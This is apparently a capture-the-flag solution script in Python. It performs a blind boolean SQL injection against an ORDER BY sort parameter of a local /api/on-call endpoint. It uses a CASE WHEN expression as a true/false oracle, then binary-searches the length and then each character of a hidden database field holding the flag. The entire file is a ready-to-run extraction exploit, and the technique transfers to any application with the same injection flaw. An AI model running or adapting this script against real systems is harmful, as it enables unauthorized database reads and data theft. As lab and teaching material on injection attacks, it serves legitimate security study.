#!/usr/bin/env python3
"""Blind boolean SQLi via ORDER BY to extract Dr. Bye Bye's farewell note (the flag).

Oracle: the /api/on-call `sort` param is injected directly into ORDER BY.
  sort = CASE WHEN (<cond>) THEN id ELSE -id END
  -> condition TRUE  => rows sort ascending  => LIMIT 1 returns id=10  "Dr. Ada Pulse"
  -> condition FALSE => rows sort descending => LIMIT 1 returns id=90  "Dr. Zoe Last"
The hidden flag lives in doctors.farewell_note WHERE id=404 (listed=0).
"""
import sys, requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8099"
TRUE_NAME = "Dr. Ada Pulse"
SECRET = "(SELECT farewell_note FROM doctors WHERE id=404)"
sess = requests.Session()

def oracle(cond: str) -> bool:
    expr = f"CASE WHEN ({cond}) THEN id ELSE -id END"
    r = sess.get(f"{BASE}/api/on-call", params={"sort": expr}, timeout=30)
    r.raise_for_status()
    return r.json()["doctor"]["name"] == TRUE_NAME

# 1) find length (exponential bound then binary search)
hi = 1
while oracle(f"length({SECRET}) >= {hi}"):
    hi *= 2
lo = hi // 2
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"length({SECRET}) >= {mid}"):
        lo = mid
    else:
        hi = mid - 1
length = lo
print(f"[+] flag length = {length}", file=sys.stderr)

# 2) binary-search each character over printable ASCII (32..126)
out = []
for pos in range(1, length + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"unicode(substr({SECRET},{pos},1)) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    out.append(chr(lo))
    sys.stderr.write("".join(out) + "\r"); sys.stderr.flush()
print("\n[+] FLAG:", "".join(out))